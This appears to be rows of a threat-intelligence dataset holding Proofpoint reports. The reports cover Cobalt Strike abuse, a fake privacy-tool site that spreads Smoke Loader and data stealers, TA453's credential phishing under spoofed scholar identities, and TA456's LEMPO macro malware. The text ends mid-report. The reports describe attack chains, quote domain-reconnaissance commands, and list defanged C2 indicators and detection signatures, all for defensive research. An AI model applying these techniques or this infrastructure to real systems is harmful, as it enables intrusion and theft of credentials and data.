include data through May 2021.* Threat actors can obtain Cobalt Strike in a variety of ways: purchasing it directly from the vendor’s website, which requires verification; buying a version on the dark web via various hacking forums; or using cracked, illegitimate versions of the software. In March 2020, a cracked version of Cobalt Strike 4.0 was released and made available to threat actors. ### Cobalt Strike’s Appeal Cobalt Strike is used by a diverse array of threat actors, and while it is not unusual for cybercriminal and APT actors to leverage similar tooling in their campaigns, Cobalt Strike is unique in that its built-in capabilities enable it to be quickly deployed and operationalized regardless of actor sophistication or access to human or financial resources. The job of simulating actor attacks and penetrating defenses might become a bit more straightforward when both sides are using the same tool. Cobalt Strike is also session-based — that is, if threat actors can access a host and complete an operation without needing to establish ongoing persistence, there will not be remaining artifacts on the host after it is no longer running in-memory. In essence: they can hit it and forget it. Threat actors can also use the malleability of Cobalt Strike to create customized builds that add or remove features to achieve objectives or evade detection. For example, APT29 frequently uses custom Cobalt Strike Beacon loaders to [blend in](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) with legitimate traffic or [evade analysis](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/). For defenders, customized Cobalt Strike modules often require unique signatures, so threat detection engineers may be required to play catch-up to Cobalt Strike use in the wild. Cobalt Strike is also appealing to threat actors for its inherent obfuscation. Attribution gets more difficult if everyone is using the same tool. If an organization has a red team actively making use of it, it is possible malicious traffic could be mistaken as legitimate. The software’s ease of use can improve the capabilities of less sophisticated actors. For sophisticated actors, why spend development cycles on something new when you already have a great tool for the job. Proofpoint data shows Cobalt Strike is a popular tool for everything from strategic compromises to noisy, widespread campaigns. The following examples illustrate a small sampling of the types of threat actors leveraging Cobalt Strike tracked by Proofpoint. ### Threat Actors **TA800** TA800 is a large crimeware group tracked by Proofpoint since mid-2019. This actor attempts to deliver and install banking malware or malware loaders, including The Trick and BazaLoader. In April 2020, TA800 became the first group observed distributing BazaLoader. In these early campaigns, the threat actor distributed emails with a malicious link to an executable or a landing page hosted on Google Docs with a link to an executable. The executable downloaded the BazaLoader backdoor which in turn downloaded Cobalt Strike. In February 2021, the group pivoted to distributing Cobalt Strike as a first-stage payload via malicious URLs. There has been some evidence suggesting TA800’s [NimzaLoader](https://www.proofpoint.com/us/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware)is being used to download and execute Cobalt Strike as its secondary payload. **TA547** TA547 is a crimeware actor tracked by Proofpoint since October 2017. This group appears to be interested in distributing primarily banking trojans – including The Trick and ZLoader – to various geographic regions. Since mid-2020, this actor favors using malicious Microsoft Office attachments to distribute malware. In February 2021, TA547 began distributing Cobalt Strike as a second-stage payload for command and control. **TA415** TA415 is an APT actor believed to be associated with People’s Republic of China (PRC) state interests. The group has been noted in United States court filings to be tied to PRC’s Ministry of State Security. TA415 is also known as Barium and APT41. Proofpoint identified TA415 delivering Cobalt Strike as a first-stage payload in limited campaigns during mid-2020. In September 2020, the United States Department of Justice announced the indictment of several threat actors associated with this threat group, and [detailed](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) the threat actors use of Cobalt Strike in the indictment. Based on recent [reporting by Group-IB](https://blog.group-ib.com/colunmtk_apt41), TA415 used Cobalt Strike in a campaign against an entity in the airlines sector. The following timeline provides a small sample of threat actor use of Cobalt Strike across cybercrime and APT threats. The selected events were identified based on their significance, and are not representative of the full Cobalt Strike threat landscape. ![Timeline Description automatically generated](data:image;base64_removed,) *Figure 2: Timeline of threats using Cobalt Strike. Links to the sources are available in the References section.* ### Attack Chain Proofpoint has observed dozens of threat actors using Cobalt Strike. However, like their legitimate counterparts, threat actors exhibit many attack paths and use cases of the malicious actor emulation software. Threat actors use different lure themes, threat types, droppers, and payloads. For example, the earliest Cobalt Strike campaigns distributed email threats with malicious document attachments to distribute the malware, but campaigns distributing malicious URLs directly in the email body have overtaken attachments as the more frequently utilized threat type. While instances of Cobalt Strike being sent directly as an initial payload have dramatically increased, deployment as a second stage payload remains popular. Cobalt Strike has been observed in a variety of attack chains alongside malware such as The Trick, BazaLoader, Ursnif, IcedID, and many more popular loaders. In these cases, the preceding malware typically loads and executes Cobalt Strike. Likewise, there is a wide array of techniques leveraged in cases where Cobalt Strike is delivered directly, such as via malicious macros in weaponized Office documents, compressed executables, PowerShell, dynamic data exchange (DDE), HTA/HTML files, and traffic distribution systems. After Cobalt Strike has been executed and a Beacon established for C2 communication, actors have been observed attempting to enumerate network connections and dumping Active Directory credentials as they try to move laterally to a network resource such as a Domain Controller, allowing for deployment of ransomware to all networked systems. For example, the Cobalt Strike [documentation states](https://www.cobaltstrike.com/help-beacon): Use the net dclist command to find the Domain Controller for the domain the target is joined to. Use the net view command to find targets on the domain the target is joined to. In addition to network discovery and credential dumping, Cobalt Strike Beacon also has the capability to elevate privileges, load and execute additional tools, and to inject these functions into existing running host processes to attempt to avoid detection. ### Outlook Proofpoint researchers anticipate Cobalt Strike will continue to be a commonly used tool in threat actor toolsets. According to internal data, tens of thousands of organizations have already been targeted with Cobalt Strike, based on observed campaigns. We expect this number to increase in 2021. ![Chart type: Line. TOTAL_CUST increases over time. Description automatically generated](data:image;base64_removed,) *Figure 3: Number of customers targeted by threats using Cobalt Strike* ### Conclusion Cobalt Strike is a useful tool, for legitimate security researchers and threat actors alike. Its malleability coupled with its usability makes it a robust and effective tool for siphoning data, moving laterally, and loading additional malware payloads. Cobalt Strike is not the only red team tool appearing more often in Proofpoint data. Others include Mythic, Meterpreter, and the Veil Framework. The use of publicly available tooling aligns with a broader trend observed by Proofpoint: Threat actors are using as many legitimate tools as possible, including executing Windows processes like PowerShell and WMI; injecting malicious code into legitimate binaries; and frequently using allowable services like Dropbox, Google Drive, SendGrid, and Constant Contact to host and distribute malware. #### References The following references are associated with the above timeline. January 2016 – [Odinaff: New Trojan used in high level financial attacks] (https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) May 2017 – [Microsoft Word Intruder Integrates CVE-2017-0199, Utilized by Cobalt Group to Target Financial Institutions] (https://www.proofpoint.com/us/threat-insight/post/microsoft-word-intruder-integrates-cve-2017-0199-utilized-cobalt-group-target) October 2017 – [Leviathan: Espionage actor spearphishes maritime and defense targets] (https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) April 2018 – [APT攻撃者グループ menuPass(APT10) による新たな攻撃を確認] (https://www.lac.co.jp/lacwatch/people/20180521_001638.html) November 2018 – [Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign] (https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2019 – [Seven International Cyber Defendants, Including “Apt41” Actors, Charged In Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally] (https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) November 2019 – [TA2101 plays government imposter to distribute malware to German, Italian, and US organizations] (https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us) September 2020 – [Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity] (https://us-cert.cisa.gov/ncas/alerts/aa20-258a) December 2020 – [Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor] (https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) March 2021 – [NimzaLoader: TA800’s New Initial Access Malware] (https://www.proofpoint.com/uk/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware) May 2021 – [New sophisticated email-based attack from NOBELIUM] (https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/) #### Detections Proofpoint Emerging Threats includes robust detections for Cobalt Strike. The following are a sample of our detections as they relate to the behaviors described in this report. 2028591 ET TROJAN Cobalt Strike Malleable C2 Request YouTube Profile 2028589 ET TROJAN Cobalt Strike Malleable C2 Response O365 Profile M2 2032749 ET TROJAN Cobalt Strike Malleable C2 Amazon Profile 2032746 ET TROJAN Cobalt Strike Malleable C2 QiHoo Profile 2027082 ET TROJAN Observed Malicious SSL Cert CobaltStrike C2 2023629 ET INFO Suspicious Empty SSL Certificate - Observed in Cobalt Strike 2032362 ET TROJAN Cobalt Strike Beacon Activity 2032951 ET TROJAN Observed Cobalt Strike User-Agent"
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-07-01_malware-masquerades-privacy-tool.txt,proofpoint_2021-07-01_malware-masquerades-privacy-tool,G0092,"Malware Masquerades as Privacy Tool July 01, 2021 Key Findings ------------ * Threat actors created a detailed, legitimate looking “Privacy Tools” website to trick victims into downloading malware. * The Privacy Tools site purports to offer file protection via encryption and decryption services but leads to the installation of multiple malware families. * Smoke Loader is downloaded first as the malicious executable which drops follow-on malware including Racoon Stealer and RedLine malware. Overview -------- Proofpoint researchers found a new threat enticing users to download malware by masquerading as a “Privacy Tools” service offering a tool that “encrypts” user data using a zip-like utility. The fake website is professional-looking and contains detailed descriptions of the alleged service including step-by-step instructions on how to download the privacy tools – which turn out to be malware. Proofpoint researchers identified the initial payload as Smoke Loader, a popular downloader available on easily accessible forums for buying and selling malware and used by multiple threat actors. The malware subsequently installs follow-on data-stealing malware including Raccoon Stealer and RedLine. While investigating the observed campaign, Proofpoint identified [additional](https://twitter.com/pmmkowalczyk/status/1369647346997469186) related [samples](https://twitter.com/jorgemieres/status/1382400601158455297) publicly shared by other researchers since March 2021. The privacy theme is ironic considering the ultimate payload is designed to exfiltrate information from an infected host. However, it may appeal to users who are concerned about data sharing and privacy – a number that is likely increasing due to the recent mainstream marketing of user-focused [privacy controls](https://www.npr.org/2021/04/26/990943261/apple-rolls-out-major-new-privacy-protections-for-iphones-and-ipads) from major companies like Apple. Campaign Details ---------------- The threat actors created a website offering privacy tools for business and personal use. ![1malwareasprivacy](/sites/default/files/inline-images/Picture1_8.png) *Figure 1: Screenshot of “Privacy Tools” website.* Visitors are instructed to download and install Privacy Tools software via a specific section of the website. ![MalwareasPrivacy](/sites/default/files/inline-images/PIC2.png) *Figure 2: Screenshot of the Privacy Tools download instructions.* The compressed executables available for download purport to be file protection resources. The website actually downloads Smoke Loader, a modular downloader with multiple capabilities. Smoke Loader first appeared in 2011 and is available for purchase on criminal forums. It is commonly used by threat actors that target both individual and corporate users. Proofpoint researchers observed that the Smoke Loader infection subsequently downloads follow-on malware to conduct information-gathering activities. Identified second-stage payloads include RedLine and Raccoon Stealer malware. Additional [security researchers](https://twitter.com/pmmkowalczyk/status/1369647346997469186) noticed this activity in 2021 along with Proofpoint observations. Raccoon Stealer is an increasingly popular malware that first appeared in 2019. It was [advertised as](https://blog.cyberint.com/raccoon-stealer) a “malware as a service” on cybercriminal forums. It can steal credentials such as passwords, website cookies, credit card data, system information, and bitcoin wallet contents. RedLine Stealer is a malware that aims to steal information from browsers such as login, autocomplete, passwords, and credit cards. It also collects information about the user and their system, such as the username, location, hardware configuration, and installed security software. An [update](https://bartblaze.blogspot.com/2021/06/digital-artists-targeted-in-redline.html) to [RedLine](https://www.proofpoint.com/uk/threat-insight/post/new-redline-stealer-distributed-using-coronavirus-themed-email-campaign) Stealer in early 2021 also added the ability to steal cryptocurrency cold wallets. Proofpoint does not attribute the activity to a specific group. One IP address identified in this campaign is associated with OpenNIC, a public service used for resolving certain types of domains that provides alternatives to domains not administered by ICANN. The privacy-themed websites delivering Smoke Loader in this campaign were registered by ssserviceshop1@yandex[.]ru via Registrar of Domain Names REG[.]ru, LLC. Multiple other privacy-themed domains and C2 IPs were also registered with the same email address and registrar. ***Analyst Note:***[*Previous research*](https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/operation-ta505-part3/) *published in May 2020 attributed a Smoke Loader-related domain registered with the same email and URL naming conventions as observed in this campaign to TA505. Proofpoint cannot confirm the veracity of that reporting. There is no available evidence to attribute the observed activity in the privacy-themed campaigns to TA505.* Conclusion ---------- The use of a privacy-themed lure to download information-stealing malware is an ironic yet predatory mechanism for enticing users to download malware. The lure is likely effective as the threat actors behind the campaign appear to have taken considerable time and effort to design a legitimate-looking privacy tool. Based on additional indicators uncovered, it is likely this threat actor is conducting – and has previously conducted – similar campaigns using privacy themes and convincing lures to distribute Smoke Loader and follow-on malware. Proofpoint anticipates this type of theme and activity to continue, especially for consumers who do not have corporate privacy and security services already installed on their hosts. Indicators of Compromise (IOCs) Observed in Identified Smoke Loader Campaign | **IOC** | **IOC Type** | **Description** | | privacytools[.]xyz | Domain | Website hosting fake privacy tool download | | privacytoolsforyou[.]site | Domain | Website hosting fake privacy tool download | | privacmytools[.]site | Domain | Website hosting fake privacy tool download | | http://999080321newfolder1002002131-service1002[.]space/ | URL | C2 | | http://999080321newfolder1002002231-service1002[.]space/ | URL | C2 | | http://999080321newfolder3100231-service1002[.]space/ | URL | C2 | | http://999080321newfolder1002002431-service1002[.]space/ | URL | C2 | | http://999080321newfolder1002002531-service1002[.]space/ | URL | C2 | | http://999080321newfolder33417-012425999080321[.]space/ | URL | C2 | | http://999080321test125831-service10020125999080321[.]space/ | URL | C2 | | http://999080321test136831-service10020125999080321[.]space/ | URL | C2 | | http://999080321test147831-service10020125999080321[.]space/ | URL | C2 | | http://999080321test146831-service10020125999080321[.]space/ | URL | C2 | | http://999080321test134831-service10020125999080321[.]space/ | URL | C2 | | http://999080321est213531-service1002012425999080321[.]ru/ | URL | C2 | | http://999080321yes1t3481-service10020125999080321[.]ru/ | URL | C2 | | http://999080321test13561-service10020125999080321[.]su/ | URL | C2 | | http://999080321test14781-service10020125999080321[.]info/ | URL | C2 | | http://999080321test13461-service10020125999080321[.]net/ | URL | C2 | | http://999080321test15671-service10020125999080321[.]tech/ | URL | C2 | | http://999080321test12671-service10020125999080321[.]online/ | URL | C2 | | http://999080321utest1341-service10020125999080321[.]ru/ | URL | C2 | | http://999080321uest71-service100201dom25999080321[.]ru/ | URL | C2 | | http://999080321test61-service10020125999080321[.]website/ | URL | C2 | | http://999080321test51-service10020125999080321[.]xyz/ | URL | C2 | | http://999080321test41-service100201pro25999080321[.]ru/ | URL | C2 | | http://999080321yest31-service100201rus25999080321[.]ru/ | URL | C2 | | http://999080321rest21-service10020125999080321[.]eu/ | URL | C2 | | http://999080321test11-service10020125999080321[.]press/ | URL | C2 | | http://999080321newfolder4561-service10020125999080321[.]ru/ | URL | C2 | | http://999080321rustest213-service10020125999080321[.]ru/ | URL | C2 | | http://999080321test281-service10020125999080321[.]ru/ | URL | C2 | | http://999080321test261-service10020125999080321[.]space/ | URL | C2 | | http://999080321yomtest251-service10020125999080321[.]ru/ | URL | C2 | | http://999080321yirtest231-service10020125999080321[.]ru/ | URL | C2 | | http://999080321test391-service10020125999080321[.]ru/ | URL | C2 | | http://999080321test481-service10020125999080321[.]ru/ | URL | C2 | | http://999080321test571-service10020125999080321[.]pro/ | URL | C2 | | http://999080321test461-service10020125999080321[.]host/ | URL | C2 | | http://999080321test231-service10020125999080321[.]fun/ | URL | C2 | | http://999080321tostest371-service10020125999080321[.]ru/ | URL | C2 | | http://999080321oopoest361-service10020125999080321[.]ru/ | URL | C2 | | http://999080321newfolder481-service10020125999080321[.]ru/ | URL | C2 | | http://999080321newfolder471-service10020125999080321[.]ru/ | URL | C2 | | http://999080321newfolder351-service10020125999080321[.]ru/ | URL | C2 | | http://999080321newfolder241-service10020125999080321[.]ru/ | URL | C2 | | http://999080321newfolder1002-service100201shop25999080321[.]ru/ | URL | C2 | | http://999080321newfolder1002-service100201life25999080321[.]ru/ | URL | C2 | | http://999080321newfolder1002-service100201blog25999080321[.]ru/ | URL | C2 | | http://999080321megatest251-service10020125999080321[.]ru/ | URL | C2 | | http://999080321infotest341-service10020125999080321[.]ru/ | URL | C2 | | http://999080321besttest971-service10020125999080321[.]ru/ | URL | C2 | | http://999080321shoptest871-service10020125999080321[.]ru/ | URL | C2 | | http://999080321kupitest451-service10020125999080321[.]ru/ | URL | C2 | | http://999080321proftest981-service10020125999080321[.]ru/ | URL | C2 | | http://999080321clubtest561-service10020125999080321[.]ru/ | URL | C2 | | http://999080321mytest151-service1002012425999080321[.]ru/ | URL | C2 | | http://999080321newfoldert161-service1002012425999080321[.]ru/ | URL | C2 | | http://999080321newfolder100251-service25999080321[.]ru/ | URL | C2 | | http://999080321newfolder100241-service10020999080321[.]ru/ | URL | C2 | | http://999080321newfolder100231-service1022020[.]ru/ | URL | C2 | | http://999080321newfolder100221-service1022020[.]ru/ | URL | C2 | | http://999080321newfolder1002-012525999080321[.]ml/ | URL | C2 | | http://999080321newfolder1002-012625999080321[.]ga/ | URL | C2 | | http://999080321newfolder1002-012725999080321[.]cf/ | URL | C2 | | http://999080321newfolder1002-012825999080321[.]gq/ | URL | C2 | | http://999080321newfolder1002-012925999080321[.]com/ | URL | C2 | | http://999080321newfolder1002-01302599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01312599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01322599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01332599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01342599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01352599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01362599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01372599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01382599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01392599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01402599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01412599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01422599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01432599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01442599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01452599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01462599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01472599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01482599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01492599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01502599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01512599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01522599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01532599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01542599908032135[.]site/ | URL | C2 | | http://999080321newfolder1002-01552599908032135[.]site/ | URL | C2 | | 192[.]71[.]245[.]208 | IP | DNS | | 91[.]217[.]137[.]37 | IP | DNS | | 172[.]104[.]136[.]243 | IP | DNS | | 176[.]126[.]70[.]119 | IP | DNS | | 94[.]103[.]153[.]176 | IP | DNS | | 161[.]97[.]219[.]84 | IP | DNS | | 207[.]192[.]71[.]13 | IP | DNS | | 188[.]226[.]146[.]136 | IP | DNS | | 178[.]63[.]116[.]152 | IP | DNS | | 13[.]239[.]157[.]177 | IP | DNS | | 0xa8e21be | SendRC4Key | RSA Encryption Key | | 0x8fc93161 | RecvRC4Key | RSA Encryption Key |"
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453.txt,proofpoint_2021-07-13_operation-spoofedscholars-conversation-ta453,G0059,"Operation SpoofedScholars: A Conversation with TA453 July 13, 2021 ### Key Takeaways * [TA453](https://www.proofpoint.com/us/blog/threat-insight/badblood-ta453-targets-us-and-israeli-medical-research-personnel-credential), an Iranian - state aligned actor, masqueraded as British scholars to covertly target individuals of intelligence interest to the Iranian government in what Proofpoint has dubbed Operation SpoofedScholars. * The email conversations were benign until TA453 provided a link to a compromised website hosting a credential harvesting page. * The use of a legitimate but actor-compromised website is an increase in sophistication compared to TA453’s historical Tactics, Techniques, and Procedures of using actor-controlled credential phishing websites. * Proofpoint has worked with the appropriate authorities to conduct victim notification. ### Overview Masquerading as UK scholars with the University of London’s School of Oriental and African Studies (SOAS), the threat actor TA453 has been covertly approaching individuals since at least January 2021 to solicit sensitive information. The threat actor, an APT who we assess with high confidence supports Islamic Revolutionary Guard Corps (IRGC) intelligence collection efforts, established backstopping for their credential phishing infrastructure by compromising a legitimate site of a highly regarded academic institution to deliver personalized credential harvesting pages disguised as registration links. Identified targets included experts in Middle Eastern affairs from think tanks, senior professors from well-known academic institutions, and journalists specializing in Middle Eastern coverage. These connection attempts were detailed and extensive, often including lengthy conversations prior to presenting the next stage in the attack chain. Once the conversation was established, TA453 delivered a “registration link” to a legitimate but compromised website belonging to the University of London’s SOAS radio. The compromised site was configured to capture a variety of credentials. Of note, TA453 also targeted the personal email accounts of at least one of their targets. In subsequent phishing emails, TA453 shifted their tactics and began delivering the registration link earlier in their engagement with the target without requiring extensive conversation. This operation, dubbed SpoofedScholars, represents one of the more sophisticated TA453 campaigns identified by Proofpoint. ![Text Box](data:image;base64_removed,) ### Chatting with TA453 In early 2021, a TA453 persona, “Dr.Hanns Bjoern Kendel, Senior Teaching and Research Fellow at SOAS University in London,” used email address hannse.kendel4[@]gmail.com to solicit conversations with targets. The following is a brief summary of an example conversation observed by Proofpoint Threat Research: TA453 sent an initial email trying to entice the target with a prospective invitation to an online conference on “The US Security Challenges in the Middle East. TA453 strived to connect with the individual via phone to discuss the invitation; however, after the target hedged and emphatically stated that they wanted a written proposal with the details, TA453 acquiesced with conference specifics. After a little back and forth that verified the target’s interest, TA453 provided a detailed invitation to the fake conference (Figure 1). The conversation concluded with TA453 attempting to get the target to connect via videoconferencing. ![Text, letter Description automatically generated](data:image;base64_removed,) *Figure 1. Fake conference invitation.* ### Conversation Analysis Throughout the conversation, Proofpoint identified a few interesting themes: * TA453 demonstrates passable English skills and is open to voice communication via videoconferencing. * TA453 demonstrates an interest in mobile phone numbers, possibly for mobile malware or additional phishing. * TA453 repeatedly demonstrated a desire to connect with the target in real-time. ### Personal Targeting In addition to Hanns’ solicitations, at least one target received a credential harvesting email to their personal email account. This attempt did not masquerade as Dr. Kendel but did still attempt to harvest credentials from the target. Currently, Proofpoint does not have more information on this specific kill chain. ### Campaign Breakdown **Targets** TA453 targets in Operation SpoofedScholars can be clustered into three main categories that are consistent with the IRGC’s historical collection priorities. * Senior think tank personnel * Journalists focused on Middle Eastern affairs * Professors These groupings consistently have information of interest to the Iranian government, including, but not limited to, information about foreign policy, insights into Iranian dissident movements, and understanding of U.S. nuclear negotiations, and most of the identified targets have been previously targeted by TA453. Targeting appeared to be highly selective, with less than ten organizations targeted, according to Proofpoint data. **Infrastructure** Once TA453 established a time for the target to activate their invitation, the TA453 persona provided the personalized link to the intended victim. The link led to a “Webinar Control Panel” on a legitimate but compromised website belonging to University of London’s SOAS, a research institution. According to Proofpoint research, while TA453 does appear to have elevated privileges allowing them to create credential harvesting pages at soasradio[.]org, other pages on the site continue to host legitimate SOAS-affiliated content. TA453 strengthened the credibility of the attempted credential harvest by utilizing personas masquerading as legitimate affiliates of SOAS to deliver the malicious links. The displayed webpage (Figure 2) offers users the ability to use “OpenID” to log in with the following mail providers; Google, Yahoo, Microsoft, iCloud, Outlook, AOL, mail.ru, Email, and Facebook. The website URI was hxxps://soasradio[.]org/connect/?memberemailid= [RedactedInitials of Target]-[String of alphanumeric characters]. ![Graphical user interface Description automatically generated](data:image;base64_removed,) *Figure 2. SOAS displayed webpage.* When a particular provider is clicked, a pop-up box (Figure 3) displays the actual credential phishing box. Of the options, Google, Microsoft, and Email buttons prefilled the target’s email address. Based on the variety of email providers along with TA453’s insistence that the target log on when TA453 was online, Proofpoint assesses that TA453 was planning on immediately validating the captured credentials manually. ![microsoft ](/sites/default/files/inline-images/MicrosoftTeams-image%20%287%29.png) *Figure 3. “AOL login window”* Hanns Kendel was not the only SOAS scholar spoofed by TA453 during Operation SpoofedScholars. Months later, TA453 began spoofing Tolga Sinmazdemir, another individual associated with SOAS. These emails solicited contributions to a “DIPS Conference” and would have likely followed a similar kill chain discussed above. In mid-May, TA453 returned, using a different email (hanse.kendel4[@]gmail.com) to recruit for a webinar. **Attribution** As discussed previously in Proofpoint’s research on TA453’s [BadBlood](/us/blog/threat-insight/badblood-ta453-targets-us-and-israeli-medical-research-personnel-credential ""BadBlood: TA453 Targets US and Israeli Medical Research Personnel in Credential Phishing Campaigns "") campaign, Proofpoint analysts cannot independently confirm that TA453 is part of the IRGC. However, the tactics and techniques used by the group and their overall targeting detected by Proofpoint is in line with IRGC intelligence collection priorities, which gives us high confidence in our assessment that TA453 operates in support of the IRGC. The IRGC, specifically the IRGC Intelligence Organization, collects intelligence and conducts operations in support of a variety of assigned responsibilities. According to the Meir Amit Intelligence and Terrorism Information Center’s November 2020 [report](https://www.terrorism-info.org.il/en/the-intelligence-organization-of-the-irgc-a-major-iranian-intelligence-apparatus/), some of the IRGC IO’s responsibilities include foiling political subversion, combating western cultural penetration, and supporting the arrest of Iranian dual nationals. Likewise, attribution specifically for Operation SpoofedScholars is based on TTP similarities to previous TA453 campaigns and consistency with TA453’s historical targeting. TA453 often uses free email providers to spoof individuals familiar to their targets to increase the likelihood of successful compromise. Additionally, as previously discussed, TA453 concentrates their credential phishing to specific individuals of interest to collect intelligence through exfiltration of sensitive email and contacts or initial access for future phishing campaigns. **Mitigation** For specific mitigations against Operation SpoofedScholars, Proofpoint recommends investigating network traffic to soasradio[.]org, specifically URIs starting with hxxps://soasradio[.]org/connect/?memberemailid=. Additionally, emails from hanse.kendel4[@]gmail.com, hannse.kendel4[@]gmail.com, and t.sinmazdemir32[@]gmail.com should be considered suspect and investigated. Broader mitigation efforts against TA453 campaigns include increased awareness and investigation of unusual communication from professional contacts. Academics, journalists, and think tank scholars should practice caution and verify the identity of the individuals offering them unique opportunities, especially if those opportunities occur virtually. Using multifactor authentication provides another layer of protection against TA453 credential harvesting. ### **Conclusion** TA453 illegally obtained access to a website belonging to a world class academic institution to leverage the compromised infrastructure to harvest the credentials of their intended targets. The use of legitimate, but compromised, infrastructure represents an increase in TA453’s sophistication and will almost certainly be reflected in future campaigns. TA453 continues to iterate, innovate, and collect in support of IRGC collection priorities. While some of the identified selectors no longer appear to be active in TA453 operations, Proofpoint assesses with high confidence that TA453 will continue to spoof scholars around the world in support of TA453’s intelligence collection operations in support of Iranian government interests. Academics, journalists, and think tank personnel should practice caution and verify the identity of the individuals offering them unique opportunities. **ET** **Signature** 2033317 - ET Malware Operation SpoofedScholars Activity (GET)"
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-07-28_i-knew-you-were-trouble.txt,proofpoint_2021-07-28_i-knew-you-were-trouble,G0003,"I Knew You Were Trouble: TA456 Targets Defense Contractor with Alluring Social Media Persona July 28, 2021 ### Key Takeaways * TA456, an Iranian-state aligned actor, spent years masquerading as the persona “Marcella Flores” in an attempt to infect the machine of an employee of an aerospace defense contractor with malware. * The malware, dubbed by Proofpoint as LEMPO, was designed to establish persistence, perform reconnaissance, and exfiltrate sensitive information. * TA456 actively targets smaller subsidiaries and contractors in support of efforts to compromise larger defense contractors using a supply chain compromise. * While targeting defense contractors is not new for TA456, this campaign uniquely establishes the group as one of the most determined Iranian-aligned threat actors tracked by Proofpoint because of its significant use of social engineering, cross platform communication, and general persistence. ### Overview Proofpoint researchers have identified a years-long social engineering and targeted malware campaign by the Iranian-state aligned threat actor TA456. Using the social media persona “Marcella Flores,” TA456 built a relationship across corporate and personal communication platforms with an employee of a small subsidiary of an aerospace defense contractor. In early June 2021, the threat actor attempted to capitalize on this relationship by sending the target malware via an ongoing email communication chain. Designed to conduct reconnaissance on the target’s machine, the macro-laden document contained personalized content and demonstrated the importance TA456 placed on the target. Once the malware, which is an updated version of [Liderc](https://blog.talosintelligence.com/2019/09/tortoiseshell-fake-veterans.html) that Proofpoint has dubbed LEMPO, establishes persistence, it can perform reconnaissance on the infected machine, save the reconnaissance details to the host, exfiltrate sensitive information to an actor-controlled email account via SMTPS, and then cover its tracks by deleting that day’s host artifacts. This campaign exemplifies the persistent nature of certain state aligned threats and the human engagement they are willing to conduct in support of espionage operations. In mid-July, Facebook disrupted a network of similar personas they attributed to Tortoiseshell. LEMPO, the malware, whose delivery Proofpoint disrupted, along with the network of personas, are attributed to TA456. This actor is believed to be loosely aligned with the Islamic Revolutionary Guard Corps (IRGC) via association with the Iranian company Mahak Rayan Afraz (MRA), according to Facebook’s analysis. ![TA456](/sites/default/files/inline-images/TA456.png) ### Campaign Breakdown Proofpoint data shows that over at least eight months, “Marcella (Marcy) Flores” sent TA456’s target benign email messages, photographs, and a video to establish her veracity and build rapport with the intended victim. At one time, TA456 attempted to send a benign, but flirtatious video via a OneDrive URL. In early June, a TA456 actor self-identified as “Marcy” sent another OneDrive link, this time masquerading as a diet survey (Figure 1). ![Survey](/sites/default/files/inline-images/DIET%20SURVEY.png) *Figure 1. The diet survey email sent to the target.* The OneDrive URL delivered a .rar file (dfddbd09ccea598c4841f1abbc927f1c661d85d4bd9bcb081f7c811212d8a64a) containing a .xlsm (Figure 2) (612bdfb4f6eaf920a7a41fa06de8d99f6ecf6ad147374efa6eb1d5aff91df558). Using previous conversation topics with the target, the .xlsm purported to be pandemic diet assistance and requested that the user enable content to access the privacy protected portions of the file. If the content is enabled, the macro will create and hide the directory \Appdata\Perflog and then write LEMPO, a very simple but ingenious plaintext stealer comprised of Visual Basic Script (VBS), to that directory (Schedule.vbs 1534f95f49ddf2ada38561705f901e5938470c1678d6a81f0f4177ba7412ef5b). After authoring the VBS, the Excel macro will add a registry key 